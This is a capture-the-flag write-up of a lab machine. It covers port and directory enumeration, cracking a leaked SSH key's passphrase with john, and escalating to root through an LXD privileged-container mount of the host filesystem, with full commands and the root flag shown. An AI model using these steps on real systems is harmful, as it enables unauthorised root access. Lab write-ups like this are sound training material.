#IP
10.10.155.204

###Enumeration
####Nmap
Found two ports running on the machine
1. HTTP - 80
2. SSH  - 22
```console
❯ nmap -sC -sV 10.10.155.204 | tee nmap.log
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-09 11:30 IST
Nmap scan report for 10.10.155.204
Host is up (0.19s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 34:0e:fe:06:12:67:3e:a4:eb:ab:7a:c4:81:6d:fe:a9 (RSA)
|   256 49:61:1e:f4:52:6e:7b:29:98:db:30:2d:16:ed:f4:8b (ECDSA)
|_  256 b8:60:c4:5b:b7:b2:d0:23:a0:c7:56:59:5c:63:1e:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: House of danak
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.21 seconds

```
####Gobuster
On the website found user name `john` in comments
Found two suspicious directorities.
1. uploads
2. secret
```console
❯ gobuster dir --url http://10.10.155.204  -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt | tee gobuster.log
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.155.204
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/10/09 11:31:52 Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 316] [--> http://10.10.155.204/uploads/]
/secret               (Status: 301) [Size: 315] [--> http://10.10.155.204/secret/]


```
- The `secret` directory has secret key or the id_rsa key for the user josh
- The `/uploads` directory had dict.lst file
##JOHN
Used ssh2john to convert key to hash and cracked the hash with john and wordlist as dict.lst
```console
❯ john -w=dict.lst hash | tee john.log
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
letmein        <------User password for ssh_key  (hash.txt)  
```
##SSH
Secure shelled the device with
```console
❯ ssh -i hash.txt john@10.10.155.204
Enter passphrase for key 'hash.txt': 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-76-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Oct  9 06:44:38 UTC 2022

  System load:  0.0               Processes:             108
  Usage of /:   41.3% of 9.78GB   Users logged in:       1
  Memory usage: 50%               IP address for eth0:   10.10.155.204
  Swap usage:   0%                IP address for lxdbr0: 10.229.116.1


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

0 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sun Oct  9 06:11:48 2022 from 10.17.39.205
john@exploitable:~$
```
On Checking users found user lxd 
```console
john@exploitable:/tmp$ id
uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```
Clone repository [lxd-alpine-builder](https://github.com/saghul/lxd-alpine-builder) to make a new lxd image
```console
❯ git clone  https://github.com/saghul/lxd-alpine-builder.git
Cloning into 'lxd-alpine-builder'...
remote: Enumerating objects: 50, done.
remote: Counting objects: 100% (8/8), done.
remote: Compressing objects: 100% (6/6), done.
remote: Total 50 (delta 2), reused 5 (delta 2), pack-reused 42
Receiving objects: 100% (50/50), 3.11 MiB | 13.12 MiB/s, done.
Resolving deltas: 100% (15/15), done.
❯ cd lxd-alpine-builder

```
Made a new image for lxd

```console
❯ sudo ./build-alpine
Determining the latest release... v3.16
Using static apk from http://dl-cdn.alpinelinux.org/alpine//v3.16/main/x86_64
Downloading apk-tools-static-2.12.9-r3.apk
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
Downloading alpine-keys-2.4-r1.apk
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
<---snip--->
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
alpine-devel@lists.alpinelinux.org-6165ee59.rsa.pub: OK
Verified OK
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2663  100  2663    0     0    555      0  0:00:04  0:00:04 --:--:--   602
--2022-10-09 11:56:43--  http://alpine.mirror.wearetriple.com/MIRRORS.txt
Resolving alpine.mirror.wearetriple.com (alpine.mirror.wearetriple.com)... 93.187.10.106, 2a00:1f00:dc06:10::106
Connecting to alpine.mirror.wearetriple.com (alpine.mirror.wearetriple.com)|93.187.10.106|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2663 (2.6K) [text/plain]
Saving to: ‘/home/divu050704/lxd-alpine-builder/rootfs/usr/share/alpine-mirrors/MIRRORS.txt’

/home/divu050704/lxd 100%[======================>]   2.60K  --.-KB/s    in 0s

2022-10-09 11:56:43 (263 MB/s) - ‘/home/divu050704/lxd-alpine-builder/rootfs/usr/share/alpine-mirrors/MIRRORS.txt’ saved [2663/2663]

Selecting mirror http://dl-cdn.alpinelinux.org/alpine//v3.16/main
fetch http://dl-cdn.alpinelinux.org/alpine//v3.16/main/x86_64/APKINDEX.tar.gz
(1/21) Installing alpine-baselayout-data (3.2.0-r23)
<---snip--->
(20/21) Installing alpine-keys (2.4-r1)
(21/21) Installing alpine-base (3.16.2-r0)
Executing busybox-1.35.0-r17.trigger
OK: 8 MiB in 21 packages

```
Moved the `.tar.gz` file to the compromised machine and loaded the image to gain root access
```console
john@exploitable:/tmp$ lxc image import ./alpine-v3.16-x86_64-20221009_1156.tar.gz  --alias myimage
Image imported with fingerprint: 77a84ec6d1ed4950dcb6b981b635127be5191fb94fcd55d84c1
john@exploitable:/tmp$ lxc image list
+---------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE         |
+---------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
| myimage | 77a84ec6d1ed | no     | alpine v3.16 (20221009_11:56) | x86_64 | 3.07MB | Oct 9, 2022 at 6:30am (UTC) |
+---------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
john@exploitable:/tmp$ lxc init myimage ignite -c security.privileged=true
Creating ignite
john@exploitable:/tmp$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to ignite
john@exploitable:/tmp$ lxc start ignite
john@exploitable:/tmp$ lxc exec ignite /bin/sh
~ # find  / -name "root.txt"
find: /sys/kernel/debug: Permission denied
/mnt/root/root/root.txt
/ # cat /mnt/root/root/root.txt
2e337b8c9f3aff0c2b3e8d4e6a7c88fc
/ # 
```
**Device Pwned ;)**
